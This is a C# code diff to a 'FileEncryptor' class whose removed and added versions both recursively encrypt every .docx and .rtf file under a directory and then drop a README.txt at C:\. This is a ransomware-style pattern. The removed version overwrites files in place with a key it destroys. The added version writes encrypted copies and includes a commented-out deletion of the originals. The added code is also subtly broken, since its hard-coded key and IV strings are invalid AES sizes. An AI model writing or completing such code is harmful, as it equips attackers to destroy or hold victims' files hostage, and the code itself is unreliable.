@@ -1,6 +1,5 @@
 using System;
 using System.IO;
-using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
@@ -8,92 +7,46 @@ namespace FileEncryption
 {
     public static class FileEncryptor
     {
-        private const int CALG_AES_128 = 0x0000660e;
-        private const int CRYPT_EXPORTABLE = 0x00000001;
-        private const int PROV_RSA_AES = 24;
-        private const int KP_KEYLEN = 9;
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptDestroyKey(IntPtr hKey);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);
+        private static readonly byte[] Key = Encoding.UTF8.GetBytes("YourEncryptionKey");
+        private static readonly byte[] IV = Encoding.UTF8.GetBytes("YourInitializationVector");
 
         public static void EncryptFiles(string directoryPath)
         {
-            IntPtr hProvider = IntPtr.Zero;
-            IntPtr hKey = IntPtr.Zero;
+            string[] fileExtensions = { ".docx", ".rtf" };
 
-            try
+            foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
             {
-                if (!CryptAcquireContext(out hProvider, null, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0))
+                string extension = Path.GetExtension(file);
+
+                if (Array.IndexOf(fileExtensions, extension) >= 0)
                 {
-                    throw new System.Security.Cryptography.CryptographicException(Marshal.GetLastWin32Error());
-                }
-
-                if (!CryptGenKey(hProvider, CALG_AES_128, CRYPT_EXPORTABLE, out hKey))
-                {
-                    throw new System.Security.Cryptography.CryptographicException(Marshal.GetLastWin32Error());
-                }
-
-                string[] fileExtensions = { ".docx", ".rtf" };
-
-                foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
-                {
-                    string extension = Path.GetExtension(file);
-
-                    if (Array.IndexOf(fileExtensions, extension) >= 0)
-                    {
-                        EncryptFile(file, hKey);
-                    }
-                }
-
-                string readmePath = Path.Combine("C:\\", "README.txt");
-                File.WriteAllText(readmePath, "done");
-            }
-            finally
-            {
-                if (hKey != IntPtr.Zero)
-                {
-                    CryptDestroyKey(hKey);
-                }
-
-                if (hProvider != IntPtr.Zero)
-                {
-                    CryptReleaseContext(hProvider, 0);
+                    EncryptFile(file);
                 }
             }
+
+            string readmePath = Path.Combine("C:\\", "README.txt");
+            File.WriteAllText(readmePath, "done");
         }
 
-        private static void EncryptFile(string filePath, IntPtr hKey)
+        private static void EncryptFile(string filePath)
         {
-            byte[] fileData = File.ReadAllBytes(filePath);
-            byte[] encryptedData = EncryptData(fileData, hKey);
+            byte[] encryptedData;
 
-            using (FileStream fileStream = new FileStream(filePath, FileMode.Create))
+            using (Aes aes = Aes.Create())
             {
-                fileStream.Write(encryptedData, 0, encryptedData.Length);
+                aes.Key = Key;
+                aes.IV = IV;
+
+                using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open))
+                using (FileStream outputFileStream = new FileStream(filePath + ".encrypted", FileMode.Create))
+                using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    inputFileStream.CopyTo(cryptoStream);
+                }
             }
-        }
 
-        private static byte[] EncryptData(byte[] data, IntPtr hKey)
-        {
-            byte[] encryptedData = new byte[data.Length];
-            Buffer.BlockCopy(data, 0, encryptedData, 0, data.Length);
-
-            int dataLength = encryptedData.Length;
-            CryptEncrypt(hKey, IntPtr.Zero, true, 0, encryptedData, ref dataLength, dataLength);
-
-            return encryptedData;
+            // Optionally, you can delete the original file after encryption.
+            // File.Delete(filePath);
         }
     }
 
@@ -114,9 +67,4 @@ namespace FileEncryption
             }
         }
     }
-}
-
-if (!CryptAcquireContext(out hProvider, "MyKeyContainer", "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0))
-{
-    throw new System.Security.Cryptography.CryptographicException(Marshal.GetLastWin32Error());
 }
